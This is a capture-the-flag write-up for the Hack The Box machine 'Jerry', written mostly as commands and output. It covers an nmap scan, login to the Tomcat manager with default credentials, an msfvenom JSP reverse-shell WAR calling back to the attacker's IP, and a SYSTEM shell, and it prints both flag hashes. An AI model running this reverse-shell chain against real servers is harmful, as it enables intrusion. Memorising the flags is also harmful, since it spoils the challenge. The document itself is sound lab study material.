# jerry: https://app.hackthebox.com/machines/Jerry

```bash
nmap -sC -sV 10.10.10.95 -Pn

Nmap scan report for 10.10.10.95
Host is up (0.12s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
```

```bash
#visit http://10.10.10.95:8080/manager/status

Username: tomcat
Password: s3cret
```

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.22 LPORT=7070 -f war > reverse.war
```
```bash
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload java/jsp_shell_reverse_tcp
payload => java/jsp_shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.22
LHOST => 10.10.14.22
msf6 exploit(multi/handler) > set LPORT 7070
LPORT => 7070
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.22:7070 

```
```bash
#Upload the file
http://10.10.10.95:8080/manager/html
```
```bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.22:7070 
[*] Command shell session 1 opened (10.10.14.22:7070 -> 10.10.10.95:49192) at 2023-04-25 11:50:30 -0400

Shell Banner:
Microsoft Windows [Version 6.3.9600]
-----
          

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system

C:\apache-tomcat-7.0.88>
```
```bash
C:\Users\Administrator\Desktop\flags>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  07:09 AM    <DIR>          .
06/19/2018  07:09 AM    <DIR>          ..
06/19/2018  07:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)   2,411,720,704 bytes free

C:\Users\Administrator\Desktop\flags>type 2*
type 2*
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```
***References*** <br>
<https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom><br>
